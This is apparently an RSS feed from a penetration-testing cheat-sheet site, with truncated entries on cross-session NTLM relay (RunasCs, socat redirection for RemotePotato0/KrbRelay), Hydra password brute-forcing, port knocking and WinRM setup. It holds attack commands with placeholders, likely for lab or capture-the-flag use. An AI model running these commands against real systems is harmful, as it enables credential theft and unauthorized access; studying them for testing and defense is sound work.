channel.title: Authentication on TLDRBins
channel.description: Recent content in Authentication on TLDRBins

item.title: Cross Session Relay
item.description: Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE >services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:<RELAY_PORT> $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger auth request .

item.title: Hydra
item.description: HTTP basic auth hydra -L <USERS_FILE> -P <PASSWORD_FILE> -s <TARGET_PORT> -f <TARGET> http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra <TARGET> -l <USER> -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form '/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password' +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.

item.title: Port Knocking
item.description: knockd config location # Find knock sequence cat /etc/knockd.conf TCP UDP # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i <TARGET> >/dev/null; done; ssh -i id_rsa <USER>@<TARGET> # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i <TARGET> >/dev/null; done; ssh -i id_rsa <USER>@<TARGET>

item.title: Winrm from Windows VM
item.description: Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client 2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center' | | 2. Click 'Local Area Connection' | | 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' | | 4. Under 'General', check 'Obtain an IP address automatically' | | 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP> | +-----------------------------------------------------------------------------------+ 3.
